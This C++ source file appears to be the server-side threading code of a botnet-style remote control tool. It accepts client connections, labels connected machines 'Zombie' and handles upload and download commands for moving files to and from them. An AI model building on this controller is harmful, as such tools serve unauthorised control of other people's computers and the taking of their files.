#include "Thread_Server.h"

void recv_t_old(Server* serv1)
{
	while (!serv1->getExit())
	{
		char buffer[256]{ 0 };
		std::vector<st_Client> clients = serv1->getClients();
		for (int i = 0; i < clients.size(); i++)
		{
			recv(clients[i].sock, buffer, sizeof(buffer), 0);
			std::cout << "[*] Client " << clients[i].number << " : " << buffer << std::endl;

		}
		Sleep(200);
	}
}

void listen_client(Server* serv1, const unsigned short nb)
{
	char buffer[BUFFER_LEN] = { 0 };
	char big_buffer[HUGE_BUFFER] = { 0 };
	while (strcmp(buffer, "exit") != 0)
	{
		std::vector<st_Client> clients = serv1->getClients();
		if (recv(clients[nb].sock, buffer, sizeof(buffer), 0) > 0)
		{
			std::vector<std::string> args = split(buffer);

			if (args[0] == "upload" && args.size() == 2)
			{
				Transfer::uploadToClient(serv1, args[1]);
			}
			else if (args[0] == "download" && args.size() == 2)
			{
				Transfer::downloadFromClient(serv1, args[1]);
			}
			else
				print_status("Zombie : " + std::to_string(nb + 1) + ": " + buffer);
				//std::cout << "[*] Zombie " << nb + 1 << ": " << buffer << std::endl;
		}
		else
		{
			print_warning("Zombie : " + std::to_string(nb + 1) + " is unreachable ..");
			serv1->removeClient(nb);
		}
		Sleep(REFRESH_RECV);

	}
}
void accept_t(Server* serv1)
{
	while (serv1->getExit() != 1)
	{
		serv1->acceptClient();
		Sleep(1000);
	}
}
void send_t(Server* serv1)
{

	while (!serv1->getExit())
	{
		serv1->send_c();
	}
}

void refresh(bool* done, const unsigned int& refresh_rate, const int* pourcentage)
{
	while (*done != 1)
	{
		system("cls");
		Sleep(refresh_rate);
		Animations::Loading(*pourcentage);

	}
}

